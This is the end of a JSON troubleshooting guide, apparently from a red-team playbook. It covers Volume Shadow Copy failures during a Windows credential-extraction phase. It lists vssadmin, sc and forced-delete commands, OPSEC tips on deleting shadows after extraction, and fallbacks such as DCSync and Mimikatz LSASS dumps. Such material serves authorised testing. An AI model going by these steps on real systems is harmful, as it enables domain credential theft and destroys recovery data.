          "solution": "CHECK FREE SPACE: wmic logicaldisk where DeviceID='C:' get FreeSpace (shows bytes free). CALCULATE NEED: Shadow copy typically 10-30% of volume size (100 GB volume = 10-30 GB shadow). SOLUTIONS: (1) Delete old shadows: vssadmin delete shadows /for=C: /oldest /quiet (removes oldest shadow copy, frees space). (2) Resize shadow storage: vssadmin resize shadowstorage /for=C: /maxsize=10GB (allocates 10 GB for shadows, reduce if needed). (3) Clean temporary files: del C:\\Windows\\Temp\\* /F /Q && del C:\\Temp\\* /F /Q (frees space). (4) Check shadow storage allocation: vssadmin list shadowstorage /for=C: (shows used/allocated/maximum). EXTREME: If space critical, use DCSync instead (no disk space required, remote operation).",
          "prevention": "Run disk space check in Phase 1 prerequisites (before attempting shadow creation). ALWAYS check existing shadows first (vssadmin list shadows) - use existing shadows instead of creating new ones when possible (saves space and OPSEC). Delete shadows immediately after extraction (don't leave persistent until cleanup phase - reduces space usage duration)."
        },
        "VSS service not running OR service does not exist": {
          "cause": "Volume Shadow Copy Service stopped OR disabled OR not installed (rare)",
          "solution": "CHECK SERVICE STATUS: sc query vss (shows current state). IF STOPPED: Start service: net start vss OR sc start vss (requires Administrator). Verify startup type: sc qc vss (should show START_TYPE: DEMAND_START or AUTO_START). IF DISABLED: Change startup type: sc config vss start= demand (note space after '='). Then start: net start vss. IF SERVICE DOESN'T EXIST: VSS not installed (rare, non-standard Windows build). Shadow copies impossible. ALTERNATIVES: (1) DCSync (no VSS needed, requires replication rights). (2) Mimikatz LSASS dump (extracts cached credentials from memory, no VSS). (3) SAM/SECURITY registry extraction (local accounts only, not domain). SERVICE DEPENDENCIES: Verify dependencies running: RPC (RpcSs), COM+ Event System (EventSystem). Check: sc query RpcSs && sc query EventSystem.",
          "prevention": "Include VSS service check in Phase 1 prerequisites (sc query vss BEFORE attempting shadow creation). VSS enabled by default on Windows Server - if disabled, indicates hardening/custom configuration. Document if VSS disabled for report (unusual configuration, defense-in-depth attempt). Test alternative methods (DCSync) if VSS unavailable."
        }
      }
    }
  ]
}